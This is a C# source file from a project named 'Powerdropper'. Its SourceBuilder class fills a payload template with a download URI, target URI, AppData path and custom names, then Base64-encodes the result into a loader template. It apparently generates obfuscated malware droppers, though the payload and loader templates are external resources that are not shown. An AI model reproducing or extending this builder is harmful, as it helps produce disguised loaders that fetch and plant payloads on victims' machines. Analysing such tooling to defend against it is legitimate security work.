using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace Powerdropper
{
    class SourceBuilder
    {

        /*
         * Yeah I know, lots of repetive code. I was just trying to get it to work at the time
         * and I'll definitely write something more flexible in the future
         * 
         */
        public string Build(Config config )
        {
            string src = Properties.Resources.powersrc;
            src = src.Replace(config.GetReplacementName("Uri"), config.Uri );
            src = src.Replace(config.GetReplacementName("Namespace"), config.Namespace);
            src = src.Replace(config.GetReplacementName("Classname"), config.Classname);
            src = src.Replace(config.GetReplacementName("MethodName"), config.MethodName);
            src = src.Replace(config.GetReplacementName("MethodName3"), config.MethodName3);
            src = src.Replace(config.GetReplacementName("MethodName2"), config.MethodName2);
            src = src.Replace(config.GetReplacementName("ApplicationData"), config.ApplicationData);
            src = src.Replace(config.GetReplacementName("TargetUri"), config.TargetUri);

            LoaderConfig loader_config = new LoaderConfig();
            loader_config.MethodName = config.MethodName;
            loader_config.Namespace = config.Namespace;
            loader_config.Classname = config.Classname;
            loader_config.Base64Data = Convert.ToBase64String(Encoding.UTF8.GetBytes(src));

            string loader = Properties.Resources.loader;
            loader = loader.Replace(loader_config.GetReplacementName("MethodName"), loader_config.MethodName);
            loader = loader.Replace(loader_config.GetReplacementName("Namespace"), loader_config.Namespace);
            loader = loader.Replace(loader_config.GetReplacementName("Base64Data"), loader_config.Base64Data);
            loader = loader.Replace(loader_config.GetReplacementName("Classname"), loader_config.Classname);

            return loader;
        }

        private string GetReplacementPropertyName(string property)
        {
            return GetAttribute(typeof(Config), property).Name;
        }

        private ReplacementAttribute GetAttribute(Type t, string property )
        {
            return  (ReplacementAttribute)Attribute.GetCustomAttribute(t.GetProperty(property), typeof(ReplacementAttribute ));
        }
    }
}
